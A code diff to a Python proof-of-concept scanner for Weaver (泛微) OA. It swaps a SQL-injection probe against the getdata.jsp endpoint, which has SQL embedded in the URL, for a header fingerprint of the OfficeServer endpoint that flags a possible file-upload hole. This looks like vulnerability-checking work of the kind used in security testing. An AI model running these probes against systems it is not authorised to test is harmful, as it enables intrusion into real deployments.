@@ -8,10 +8,10 @@ headers = {
 def poc(target):
     try:
         target = get_standard_url(target)
-        url = target + '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+6412121cbb2dc2cb9e460cfee7046be+as+id'
+        url = target + '/OfficeServer'
         req = httpx.get(url,headers=headers)
-        if "6412121cbb2dc2cb9e460cfee7046be" in req.text and req.status_code == 200:
-            print("\033[0;31m 泛微OA V8 SQL注入漏洞："+ url )
+        if "WVS" in req.headers.get("server") and "ecology_JSessionId" in req.headers.get("set-cookie") and req.status_code == 200:
+            print("\033[0;31m 泛微OfficeServer可访问，尝试是否存在文件上传漏洞："+ url )
     except:
         pass
 
